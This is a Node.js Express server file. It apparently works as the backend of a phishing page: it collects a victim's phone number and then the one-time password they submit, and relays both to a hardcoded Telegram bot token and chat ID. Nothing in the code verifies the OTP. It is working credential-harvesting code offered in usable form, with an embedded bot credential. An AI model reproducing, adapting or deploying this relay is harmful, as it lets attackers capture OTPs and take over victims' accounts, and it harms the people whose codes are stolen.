const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Telegram Credentials
const TELEGRAM_BOT_TOKEN = '8439698505:AAGLOUR5DuMaMLm81HarVsDvQ8gFkvcZFU0';
const TELEGRAM_CHAT_ID = '8698008425';

// Native HTTPS Telegram Sender Function
function sendTelegramMessage(text) {
    return new Promise((resolve, reject) => {
        const payload = JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => resolve(data));
        });

        req.on('error', (e) => {
            console.error('Telegram Request Error:', e);
            reject(e);
        });

        req.write(payload);
        req.end();
    });
}

// 1st Step: Phone Number par OTP Request Notification
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const msg = `📲 *New OTP Request!*\n\n*Phone Number:* \`${phone}\``;
        await sendTelegramMessage(msg);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// 2nd Step: OTP Submit Notification
app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, otp } = req.body;
        const msg = `🔑 *OTP Submitted!*\n\n*Phone Number:* \`${phone}\`\n*OTP Code:* \`${otp}\``;
        await sendTelegramMessage(msg);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
